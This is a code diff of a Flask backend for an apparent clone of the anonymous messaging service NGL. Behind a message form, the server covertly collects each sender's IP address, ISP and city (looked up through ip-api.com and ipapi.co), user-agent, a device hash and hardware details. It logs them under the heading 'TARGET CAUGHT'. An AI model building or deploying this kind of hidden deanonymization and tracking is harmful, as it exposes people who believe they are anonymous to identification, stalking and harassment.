@@ -4,10 +4,8 @@ import datetime
 import requests
 
 app = Flask(__name__)
-# CORS allows your GitHub Pages site to communicate with this Render server
 CORS(app)
 
-# The "Success" page displayed to the sender
 SUCCESS_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -31,63 +29,61 @@ SUCCESS_PAGE = """
 
 @app.route('/')
 def home():
-    return "Backend is Active. Awaiting POST requests at /submit", 200
+    return "NGL Backend is ONLINE and Global.", 200
 
 @app.route('/submit', methods=['POST'])
 def submit():
     try:
-        # 1. Capture the message and User-Agent (Device Model Info)
-        msg = request.form.get('message', 'Empty')
-        ua = request.headers.get('User-Agent', 'Unknown Browser')
+        # 1. Basic Data
+        msg = request.form.get('message', 'No Message')
+        ua = request.headers.get('User-Agent', 'Unknown')
+        dev_hash = request.form.get('device_hash', 'No-Hash')
         
-        # 2. Capture the Unique Device Hash from the HTML script
-        dev_hash = request.form.get('device_hash', 'No-Hash-Found')
+        # 2. Extract Real Public IP
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
         
-        # 3. Get Real IP (Handles Render's proxy headers)
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-        
-        # 4. ISP & Location Lookup
-        network_info = "Lookup Failed"
+        # 3. Triple-Fallback ISP Lookup (Fixes the "Failed" issue)
+        network_info = "ISP Lookup Unavailable"
         try:
-            # Using ip-api for high accuracy in India
-            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,city,regionName,mobile,proxy", timeout=5)
-            data = response.json()
-            if data.get('status') == 'success':
-                is_mobile = "YES" if data.get('mobile') else "NO"
-                is_vpn = "YES" if data.get('proxy') else "NO"
-                network_info = f"{data.get('isp')} ({data.get('city')}, {data.get('regionName')}) | Mobile: {is_mobile} | VPN: {is_vpn}"
+            # Try Service A (ipapi.co)
+            res = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
+            if res.status_code == 200:
+                d = res.json()
+                network_info = f"{d.get('org')} | {d.get('city')}, {d.get('region')}"
+            else:
+                # Try Service B (ip-api.com)
+                res = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,city,mobile", timeout=3)
+                d = res.json()
+                network_info = f"{d.get('isp')} | {d.get('city')} (Mobile: {d.get('mobile')})"
         except:
-            pass
+            network_info = f"IP: {ip} (Network Timeout)"
 
-        # 5. Get Hardware Specs from HTML hidden inputs
+        # 4. Hardware Data
         gpu = request.form.get('gpu', 'Unknown')
         res = request.form.get('res', 'Unknown')
         ram = request.form.get('ram', 'Unknown')
         cores = request.form.get('cores', 'Unknown')
 
-        # 6. Format the Log Entry
+        # 5. The Report
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         log_report = (
-            f"\n{'='*60}\n"
-            f"🎯 NEW MESSAGE RECEIVED: {timestamp}\n"
+            f"\n{'#'*60}\n"
+            f"🎯 TARGET CAUGHT: {timestamp}\n"
             f"{'-'*60}\n"
-            f"🔑 DEVICE HASH: {dev_hash}\n"
-            f"💬 MESSAGE:     {msg}\n"
-            f"📱 USER-AGENT:  {ua}\n"
-            f"🌐 NETWORK:     IP: {ip} | {network_info}\n"
-            f"⚙️ HARDWARE:    GPU: {gpu} | RAM: {ram}GB | CPU: {cores} Cores | RES: {res}\n"
-            f"{'='*60}\n"
+            f"🔑 HASH:     {dev_hash}\n"
+            f"💬 MESSAGE:  {msg}\n"
+            f"📱 DEVICE:   {ua}\n"
+            f"🌐 NETWORK:  {network_info}\n"
+            f"⚙️ HARDWARE: GPU: {gpu} | RAM: {ram}GB | CPU: {cores} Cores | RES: {res}\n"
+            f"{'#'*60}\n"
         )
 
-        # 7. Print to Render Logs
         print(log_report)
-
         return render_template_string(SUCCESS_PAGE)
 
     except Exception as e:
         print(f"ERROR: {e}")
-        return "Internal Server Error", 500
+        return "Internal Error", 500
 
 if __name__ == "__main__":
     app.run()
